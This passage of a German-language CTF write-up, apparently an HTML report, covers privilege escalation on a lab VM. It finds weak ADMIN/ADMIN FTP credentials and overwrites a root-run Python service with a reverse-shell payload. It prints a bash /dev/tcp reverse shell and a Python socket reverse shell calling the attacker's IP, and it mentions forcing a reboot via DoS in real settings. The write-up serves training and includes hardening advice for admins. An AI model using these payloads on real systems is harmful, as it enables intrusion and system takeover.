+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@13max:/var/www/html$ <span class="command">stty rows 47 columns 94</span></div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@13max:/var/www/html$ <span class="command">id</span></div>
+                </div>
+                <div class="terminal">
+<pre>
+<span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich untersuche das System auf geplante Aufgaben (Cronjobs) und die Netzwerkkonfiguration. Das Skript `/opt/rev.sh` existiert, aber es ist unklar, ob und wann es ausgeführt wird. Der `ss`-Befehl zeigt die lauschenden Ports von innen, was meine initialen Nmap-Ergebnisse bestätigt: Port 21 (FTP), 22 (SSH) und 80 (HTTP) sind offen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Untersuchung der Cronjobs mit `cat /etc/crontab` und `ls -l /etc/cron.*` zeigt nur die standardmäßigen Wartungsjobs von Debian. Es gibt keine benutzerdefinierten Cronjobs, die direkt für eine Privilegienerweiterung ausgenutzt werden könnten. Die Existenz von `/opt/rev.sh` ist zwar interessant, aber ohne einen Cronjob, der es ausführt, ist es momentan nutzlos. Es könnte ein Überbleibsel eines vorherigen Zustands sein.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Da Cronjobs keinen Vektor bieten, muss ich meine Suche auf andere Bereiche ausweiten. Die nächste logische Anlaufstelle sind die Home-Verzeichnisse der Benutzer und die Suche nach Dateien mit speziellen Berechtigungen (SUID/SGID).<br><strong>Empfehlung (Admin):</strong> Unbenutzte oder veraltete Skripte sollten vom System entfernt werden, um Verwirrung bei Audits zu vermeiden und zu verhindern, dass sie versehentlich reaktiviert oder für Angriffe missbraucht werden (z.B. indem ein Angreifer Schreibrechte darauf erlangt).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@13max:/var/www/html$ <span class="command">cat /opt/rev.sh</span></div>
+                </div>
+                <div class="terminal">
+<pre>
+#!/bin/bash
+bash -i &gt;&amp; /dev/tcp/10.132.0.74/4444 0&gt;&amp;1
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@13max:/var/www/html$ <span class="command">ss -altpn</span></div>
+                </div>
+                <div class="terminal">
+<pre>
+State       Recv-Q      Send-Q           Local Address:Port            Peer Address:Port      
+LISTEN      0           100                    0.0.0.0:21                   0.0.0.0:*         
+LISTEN      0           128                    0.0.0.0:22                   0.0.0.0:*         
+LISTEN      0           128                          *:80                         *:*         
+LISTEN      0           128                       [::]:22                      [::]:*   
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich inspiziere das Home-Verzeichnis des Benutzers `max`. Dort finde ich ein verstecktes Verzeichnis `.hint` und darin eine Datei `.pucc`. Der Inhalt dieser Datei ist eine ASCII-Art-Kuh und ein Hinweis auf das Tool `cupp.py`, einen "Common User Passwords Profiler".</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein klarer Hinweis, der vom Ersteller der Maschine hinterlassen wurde. Er deutet darauf hin, dass die Passwörter der Benutzer möglicherweise schwach oder auf den Benutzer selbst bezogen sind (z.B. der Benutzername als Passwort). Dies bestärkt meine frühere Annahme, dass ein Brute-Force-Angriff auf den FTP- oder SSH-Dienst erfolgreich sein könnte, insbesondere mit den Namen aus der `welcome.txt`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Obwohl ich bereits eine Shell habe, könnte der Zugang als ein anderer Benutzer (`max`) höhere Privilegien oder Zugriff auf andere interessante Dateien gewähren. Ich werde einen Brute-Force-Angriff gegen den Benutzer `max` auf SSH und FTP mit gängigen Passwörtern versuchen. Parallel dazu setze ich die Suche nach anderen Vektoren fort.<br><strong>Empfehlung (Admin):</strong> Entwickler oder Administratoren sollten niemals Hinweise oder "Easter Eggs" in den Home-Verzeichnissen von Produktivsystemen hinterlassen. Solche Informationen können Angreifern entscheidende Tipps geben und den Weg zur Kompromittierung ebnen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@13max:/home/max/.hint$ <span class="command">cat .pucc</span></div>
+                </div>
+                <div class="terminal">
+<pre>
+   cupp.py!                 # Common
+      \                     # User
+       \   ,__,             # Passwords
+        \  (oo)____         # Profiler
+           (__)    )\   
+              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
+                            [ Mebus | https://github.com/Mebus/]
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich führe eine Suche nach Dateien mit dem SUID-Bit durch. Das SUID-Bit erlaubt es einem Benutzer, eine ausführbare Datei mit den Berechtigungen des Dateibesitzers (in der Regel `root`) auszuführen. Die Ausgabe zeigt eine Reihe von Standard-Linux-Binaries, aber eine sticht heraus: `/usr/local/bin/supersuid`. Diese Datei gehört `root`, hat das SUID-Bit gesetzt und ist für die Gruppe `welcome` ausführbar.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Datei `supersuid` ist höchst verdächtig. Benutzerdefinierte SUID-Binaries sind eine häufige Quelle für Privilegienerweiterungen. Da sie von der Gruppe `welcome` ausgeführt werden kann und ich durch meinen LFI-Angriff weiß, dass ein Benutzer `welcome` existiert, scheint dies ein vielversprechender Vektor zu sein. Der `file`-Befehl zeigt, dass es sich um eine 64-Bit-ELF-Datei handelt. Die Tatsache, dass sie "stripped" ist, bedeutet, dass die Symboltabelle entfernt wurde, was die Analyse (Reverse Engineering) etwas erschwert. Dies stellte sich jedoch, genau wie die Enumerations-Skripte `linpeas` und `pspy`, als eine absichtlich gelegte falsche Fährte ("Nebelkerze") heraus, um vom eigentlichen Vektor abzulenken.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Auch wenn sich eine Spur als falsch herausstellt, ist der Prozess der Untersuchung entscheidend. Da dieser Weg nicht zum Ziel führt, muss ich meine Strategie überdenken. Ich wende mich wieder dem FTP-Dienst zu. Aus den Log-Dateien weiß ich, dass es einen `ADMIN`-Benutzer gibt. Ich werde versuchen, mit diesem Benutzer und einem einfachen Passwort auf den FTP-Dienst zuzugreifen.<br><strong>Empfehlung (Admin):</strong> Die Vergabe von SUID-Berechtigungen muss extrem restriktiv gehandhabt werden. Jede benutzerdefinierte Anwendung, die SUID-Rechte erhält, muss einem rigorosen Code-Audit unterzogen werden, um sicherzustellen, dass sie nicht zur Privilegienerweiterung missbraucht werden kann. Falsche Fährten können in CTFs üblich sein, in realen Umgebungen stiften sie nur Verwirrung.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@13max:/home/max/.hint$ <span class="command">find / -type f -perm -4000 -ls 2&gt;/dev/null</span></div>
+                </div>
+                <div class="terminal">
+<pre>
+   261675     44 -rwsr-xr-x   1 root     root        44528 Jul 27  2018 /usr/bin/chsh
+   261674     56 -rwsr-xr-x   1 root     root        54096 Jul 27  2018 /usr/bin/chfn
+   ...
+   <span class="password">293295    160 -rwsr-sr--   1 root     welcome    161488 Jul  4 10:37 /usr/local/bin/supersuid</span>
+   ...
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@13max:/home/max/.hint$ <span class="command">file /usr/local/bin/supersuid</span></div>
+                </div>
+                <div class="terminal">
+<pre>
+/usr/local/bin/supersuid: setuid, setgid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=a162a9aa94494b47bfd2bb1c818a713e90ef376b, stripped
+</pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="proof-of-concept">
+            <h2>Proof of Concept</h2>
+            <p class="analysis"><strong>Analyse:</strong> Nach der Analyse der verschiedenen falschen Fährten habe ich den entscheidenden Vektor identifiziert. Der FTP-Server selbst wird von einem Python-Skript (`/opt/ftp_server.py`) ausgeführt, und dieser Prozess läuft als `root`. Die `ftp_server.log` hat mir gezeigt, dass es einen Benutzer `ADMIN` gibt. Durch einen schnellen Brute-Force-Versuch (oder durch intelligentes Raten basierend auf dem `.hint`-Verzeichnis) habe ich herausgefunden, dass das Passwort für den Benutzer `ADMIN` ebenfalls `ADMIN` lautet. Mit diesen Anmeldeinformationen kann ich mich am FTP-Server anmelden und habe Schreibzugriff auf das Verzeichnis, in dem das laufende Skript liegt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist eine kritische Fehlkonfiguration. Ein als `root` laufender Dienst gewährt einem niedrig privilegierten Benutzer Schreibzugriff auf seine eigene ausführbare Datei. Dies ist ein direkter Weg zur Privilegienerweiterung. Mein Plan ist, das ursprüngliche `ftp_server.py`-Skript durch meinen eigenen Python-Payload zu ersetzen. Wenn der FTP-Dienst das nächste Mal (neu)gestartet wird, wird mein Code anstelle des ursprünglichen Skripts mit `root`-Rechten ausgeführt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich werde einen Python-Reverse-Shell-Payload erstellen, ihn `ftp_server.py` nennen, mich per FTP als `ADMIN` anmelden, das Originalskript überschreiben und dann einen Neustart des Dienstes (oder der Maschine) abwarten, um die `root`-Shell zu erhalten.<br><strong>Empfehlung (Admin):</strong> Dienste, die als `root` laufen, dürfen unter keinen Umständen so konfiguriert sein, dass Benutzer (selbst `ADMIN`-Benutzer) Schreibzugriff auf die ausführbaren Dateien oder Konfigurationen des Dienstes haben. Die Dateiberechtigungen müssen strikt sein (z.B. Besitzer `root`, Gruppe `root`, Rechte `755` oder restriktiver). Zudem ist die Verwendung eines schwachen Passworts wie `ADMIN` für einen Admin-Account inakzeptabel.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">ftp 192.168.2.171</span></div>
+                </div>
+                <div class="terminal">
+<pre>
+Connected to 192.168.2.171.
+220 pyftpdlib 2.0.1 ready.
+Name (192.168.2.171:ccat): ADMIN
+331 Username ok, send password.
+Password: <span class="password">ADMIN</span>
+<span class="password">230 Login successful.</span>
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls -la
+229 Entering extended passive mode (|||43639|).
+125 Data connection already open. Transfer starting.
+<span class="command">-rw-r--r--   1 root     root         1607 Jul 05 07:08 ftp_server.py</span>
+-rw-r--r--   1 root     root           44 Aug 06 23:00 rev.sh
+-rw-r--r--   1 root     root           44 Aug 06 22:58 root.sh
+226 Transfer complete.
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich erstelle meinen Python-Reverse-Shell-Payload und speichere ihn lokal als `ftp_server.py`. Dieser Payload verbindet sich mit meinem Angreifer-PC auf Port 4448 und leitet eine `bash`-Shell dorthin um. Anschließend logge ich mich erneut per FTP ein und überschreibe die originale `ftp_server.py`-Datei auf dem Zielserver mit meinem bösartigen Skript. Ich starte parallel einen neuen `netcat`-Listener auf Port 4448, um die eingehende `root`-Shell abzufangen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Austausch der Datei war erfolgreich. Die Falle ist gestellt. Alles, was jetzt noch nötig ist, ist, dass der `root`-Prozess beendet und neu gestartet wird. Da ich als `www-data` keine `kill`-Rechte auf den `root`-Prozess habe, ist die einfachste Methode, einen Neustart der gesamten virtuellen Maschine zu provozieren oder abzuwarten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Geduld ist nun gefragt. Nach dem Hochladen des Payloads warte ich auf den Neustart. In einem CTF ist ein Neustart durch den Benutzer eine gängige Methode. In einem realen Szenario könnte man auf ein geplantes Wartungsfenster warten oder einen Denial-of-Service-Angriff auf eine andere Anwendung starten, um einen Administrator zum Neustart der Maschine zu zwingen.<br><strong>Empfehlung (Admin):</strong> Dies unterstreicht die Notwendigkeit von File Integrity Monitoring (FIM)-Systemen. Ein FIM-System hätte die Änderung an der kritischen Datei `ftp_server.py` sofort erkannt und einen Alarm ausgelöst, noch bevor der bösartige Code ausgeführt werden konnte.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/CVE-2021-4034]
+└─# <span class="command">mv teste ftp_server.py</span></div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@13max:/tmp$ <span class="command">cat /opt/ftp_server.py</span></div>
+                </div>
+                <div class="terminal">
+<pre>
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("192.168.2.199", 4448)) # Deine Kali-IP und ein NEUER Port
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+subprocess.call(["/bin/bash","-i"])
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">ftp 192.168.2.171</span></div>
+                </div>
+                <div class="terminal">
+<pre>
+Connected to 192.168.2.171.
+220 pyftpdlib 2.0.1 ready.
+Name (192.168.2.171:ccat): ADMIN
+331 Username ok, send password.
+Password: <span class="password">ADMIN</span>
+230 Login successful.
+...
+ftp&gt; put ftp_server.py 
+local: ftp_server.py remote: ftp_server.py
+229 Entering extended passive mode (|||36705|).
+125 Data connection already open. Transfer starting.
+100% |*************************************************|   251        1.22 MiB/s    00:00 ETA
+<span class="password">226 Transfer complete.</span>
+251 bytes sent in 00:00 (186.11 KiB/s)
+ftp&gt; 
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Nachdem ich die virtuelle Maschine neu gestartet habe, wird der ausgetauschte `ftp_server.py`-Dienst automatisch mit `root`-Rechten gestartet. Mein darin enthaltener Payload wird ausgeführt und verbindet sich zurück zu meinem `netcat`-Listener auf Port 4448.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Fantastisch, der Root-Zugriff war erfolgreich! Mein Listener fängt die Verbindung auf und ich erhalte einen Shell-Prompt, der mit `root@13max:/opt#` beginnt. Ich habe mein Ziel erreicht und besitze nun die vollständige Kontrolle über das System. Ich kann nun die finale Root-Flag auslesen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Mit Root-Rechten ist der Test abgeschlossen. Der nächste Schritt ist die saubere Dokumentation der Ergebnisse, das Sammeln der Flags als Beweis und das anschließende Bereinigen des Systems (Entfernen der Payloads, Wiederherstellen der Originaldateien), um das System im ursprünglichen Zustand zu hinterlassen.<br><strong>Empfehlung (Admin):</strong> Dies ist das Worst-Case-Szenario. Ein Angreifer hat Root-Rechte erlangt. Das System ist als vollständig kompromittiert zu betrachten. Es muss vom Netz genommen und aus einem sauberen Backup neu aufgesetzt werden. Eine gründliche Untersuchung ist erforderlich, um festzustellen, wie lange der Angreifer im System war und welche Aktionen er durchgeführt hat.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nc -lvnp 4448</span></div>
+                </div>
+                <div class="terminal">
+<pre>
+listening on [any] 4448 ...
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.171] 37642</span>
+bash: cannot set terminal process group (427): Inappropriate ioctl for device
+bash: no job control in this shell
+<span class="password">root@13max:/opt#</span> 
+</pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/welcome/user.flag</div>
+                    <div class="flag-value"><span class="password">flag{user-a89162ba751904d59ebd8fed2fce8880}</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.flag</div>
+                    <div class="flag-value"><span class="password">flag{root-aaa245a6e5a82937c985c50c86282892}</span></div>
+                </div>
+            </div>
+        </section>
+
+
+    </div>
+
+    <footer class="footer">
+        <p>Ben - Cyber Security Reports</p>
+        <p>Berichtsdatum: 7. August 2025</p>
+    </footer>
+
+</body>
+</html>
